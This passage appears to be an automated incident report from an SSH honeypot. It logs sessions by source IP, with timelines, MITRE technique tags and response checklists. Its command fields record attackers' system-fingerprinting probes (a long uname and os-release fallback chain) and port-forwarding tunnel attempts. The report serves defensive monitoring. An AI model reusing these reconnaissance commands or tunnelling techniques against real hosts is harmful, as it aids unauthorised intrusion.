| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:19:44` | `cowrie.session.connect` |
| `2026-08-15 00:19:45` | `cowrie.client.version` |
| `2026-08-15 00:19:45` | `cowrie.client.kex` |
| `2026-08-15 00:19:46` | `cowrie.login.success` |
| `2026-08-15 00:19:47` | `cowrie.session.params` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.success` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:47` | `cowrie.command.input` |
| `2026-08-15 00:19:48` | `cowrie.log.closed` |
| `2026-08-15 00:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851007971110

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 00:20 |
| **Last Seen** | 2026-08-15 00:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:20:32` | `cowrie.session.connect` |
| `2026-08-15 00:20:32` | `cowrie.client.version` |
| `2026-08-15 00:20:32` | `cowrie.client.kex` |
| `2026-08-15 00:20:33` | `cowrie.login.success` |
| `2026-08-15 00:20:33` | `cowrie.session.params` |
| `2026-08-15 00:20:33` | `cowrie.command.input` |
| `2026-08-15 00:20:34` | `cowrie.log.closed` |
| `2026-08-15 00:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655940b75e25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:21 |
| **Last Seen** | 2026-08-15 00:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:21:46` | `cowrie.session.connect` |
| `2026-08-15 00:21:46` | `cowrie.client.version` |
| `2026-08-15 00:21:46` | `cowrie.client.kex` |
| `2026-08-15 00:21:47` | `cowrie.login.success` |
| `2026-08-15 00:21:48` | `cowrie.session.params` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.success` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:48` | `cowrie.command.input` |
| `2026-08-15 00:21:49` | `cowrie.log.closed` |
| `2026-08-15 00:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f07de6631a

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-15 00:21 |
| **Last Seen** | 2026-08-15 00:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:21:58` | `cowrie.session.connect` |
| `2026-08-15 00:21:59` | `cowrie.client.version` |
| `2026-08-15 00:21:59` | `cowrie.client.kex` |
| `2026-08-15 00:22:01` | `cowrie.login.success` |
| `2026-08-15 00:22:02` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c13398b846db

| Field | Detail |
|---|---|
| **Source IP** | `122.160.85[.]144` |
| **First Seen** | 2026-08-15 00:22 |
| **Last Seen** | 2026-08-15 00:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:22:07` | `cowrie.session.connect` |
| `2026-08-15 00:22:08` | `cowrie.client.version` |
| `2026-08-15 00:22:08` | `cowrie.client.kex` |
| `2026-08-15 00:22:10` | `cowrie.login.success` |
| `2026-08-15 00:22:11` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.85[.]144` to AbuseIPDB if not already reported
- [ ] Block `122.160.85[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e7f808ebf4

| Field | Detail |
|---|---|
| **Source IP** | `62.16.103[.]46` |
| **First Seen** | 2026-08-15 00:23 |
| **Last Seen** | 2026-08-15 00:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:23:28` | `cowrie.session.connect` |
| `2026-08-15 00:23:28` | `cowrie.client.version` |
| `2026-08-15 00:23:28` | `cowrie.client.kex` |
| `2026-08-15 00:23:29` | `cowrie.login.success` |
| `2026-08-15 00:23:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.16.103[.]46` to AbuseIPDB if not already reported
- [ ] Block `62.16.103[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be634ee1231a

| Field | Detail |
|---|---|
| **Source IP** | `178.132.144[.]161` |
| **First Seen** | 2026-08-15 00:23 |
| **Last Seen** | 2026-08-15 00:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:23:39` | `cowrie.session.connect` |
| `2026-08-15 00:23:40` | `cowrie.client.version` |
| `2026-08-15 00:23:40` | `cowrie.client.kex` |
| `2026-08-15 00:23:41` | `cowrie.login.success` |
| `2026-08-15 00:23:41` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.132.144[.]161` to AbuseIPDB if not already reported
- [ ] Block `178.132.144[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498d75420520

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:23 |
| **Last Seen** | 2026-08-15 00:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:23:47` | `cowrie.session.connect` |
| `2026-08-15 00:23:48` | `cowrie.client.version` |
| `2026-08-15 00:23:48` | `cowrie.client.kex` |
| `2026-08-15 00:23:49` | `cowrie.login.success` |
| `2026-08-15 00:23:50` | `cowrie.session.params` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.success` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.command.input` |
| `2026-08-15 00:23:50` | `cowrie.log.closed` |
| `2026-08-15 00:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9cc4d5161c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:25 |
| **Last Seen** | 2026-08-15 00:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:25:51` | `cowrie.session.connect` |
| `2026-08-15 00:25:51` | `cowrie.client.version` |
| `2026-08-15 00:25:51` | `cowrie.client.kex` |
| `2026-08-15 00:25:52` | `cowrie.login.success` |
| `2026-08-15 00:25:53` | `cowrie.session.params` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.success` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:53` | `cowrie.command.input` |
| `2026-08-15 00:25:54` | `cowrie.log.closed` |
| `2026-08-15 00:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50f9b2d59c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:27 |
| **Last Seen** | 2026-08-15 00:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:27:52` | `cowrie.session.connect` |
| `2026-08-15 00:27:52` | `cowrie.client.version` |
| `2026-08-15 00:27:52` | `cowrie.client.kex` |
| `2026-08-15 00:27:53` | `cowrie.login.success` |
| `2026-08-15 00:27:54` | `cowrie.session.params` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.success` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:54` | `cowrie.command.input` |
| `2026-08-15 00:27:55` | `cowrie.log.closed` |
| `2026-08-15 00:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14465bfa15a6

| Field | Detail |
|---|---|
| **Source IP** | `36.135.62[.]103` |
| **First Seen** | 2026-08-15 00:28 |
| **Last Seen** | 2026-08-15 00:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:28:43` | `cowrie.session.connect` |
| `2026-08-15 00:28:44` | `cowrie.client.version` |
| `2026-08-15 00:28:44` | `cowrie.client.kex` |
| `2026-08-15 00:28:47` | `cowrie.login.success` |
| `2026-08-15 00:28:49` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.135.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `36.135.62[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1b2298cae71

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:29 |
| **Last Seen** | 2026-08-15 00:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:29:59` | `cowrie.session.connect` |
| `2026-08-15 00:29:59` | `cowrie.client.version` |
| `2026-08-15 00:29:59` | `cowrie.client.kex` |
| `2026-08-15 00:30:00` | `cowrie.login.success` |
| `2026-08-15 00:30:01` | `cowrie.session.params` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.success` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:01` | `cowrie.command.input` |
| `2026-08-15 00:30:02` | `cowrie.command.input` |
| `2026-08-15 00:30:02` | `cowrie.command.input` |
| `2026-08-15 00:30:02` | `cowrie.log.closed` |
| `2026-08-15 00:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378094df67a5

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-15 00:30 |
| **Last Seen** | 2026-08-15 00:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:30:14` | `cowrie.session.connect` |
| `2026-08-15 00:30:15` | `cowrie.client.version` |
| `2026-08-15 00:30:15` | `cowrie.client.kex` |
| `2026-08-15 00:30:16` | `cowrie.login.success` |
| `2026-08-15 00:30:17` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9bd012a21a

| Field | Detail |
|---|---|
| **Source IP** | `117.222.50[.]166` |
| **First Seen** | 2026-08-15 00:30 |
| **Last Seen** | 2026-08-15 00:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:30:22` | `cowrie.session.connect` |
| `2026-08-15 00:30:22` | `cowrie.client.version` |
| `2026-08-15 00:30:22` | `cowrie.client.kex` |
| `2026-08-15 00:30:24` | `cowrie.login.success` |
| `2026-08-15 00:30:25` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `117.222.50[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b1234be297

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 00:30 |
| **Last Seen** | 2026-08-15 00:31 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:30:59` | `cowrie.session.connect` |
| `2026-08-15 00:31:04` | `cowrie.client.version` |
| `2026-08-15 00:31:04` | `cowrie.client.kex` |
| `2026-08-15 00:31:26` | `cowrie.login.success` |
| `2026-08-15 00:31:39` | `cowrie.session.params` |
| `2026-08-15 00:31:39` | `cowrie.command.input` |
| `2026-08-15 00:31:44` | `cowrie.log.closed` |
| `2026-08-15 00:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b508c87f34

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:32 |
| **Last Seen** | 2026-08-15 00:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:32:03` | `cowrie.session.connect` |
| `2026-08-15 00:32:04` | `cowrie.client.version` |
| `2026-08-15 00:32:04` | `cowrie.client.kex` |
| `2026-08-15 00:32:05` | `cowrie.login.success` |
| `2026-08-15 00:32:06` | `cowrie.session.params` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.success` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:06` | `cowrie.command.input` |
| `2026-08-15 00:32:07` | `cowrie.log.closed` |
| `2026-08-15 00:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db10c0f4b3c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:34 |
| **Last Seen** | 2026-08-15 00:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:34:05` | `cowrie.session.connect` |
| `2026-08-15 00:34:05` | `cowrie.client.version` |
| `2026-08-15 00:34:05` | `cowrie.client.kex` |
| `2026-08-15 00:34:07` | `cowrie.login.success` |
| `2026-08-15 00:34:08` | `cowrie.session.params` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.success` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.command.input` |
| `2026-08-15 00:34:08` | `cowrie.log.closed` |
| `2026-08-15 00:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
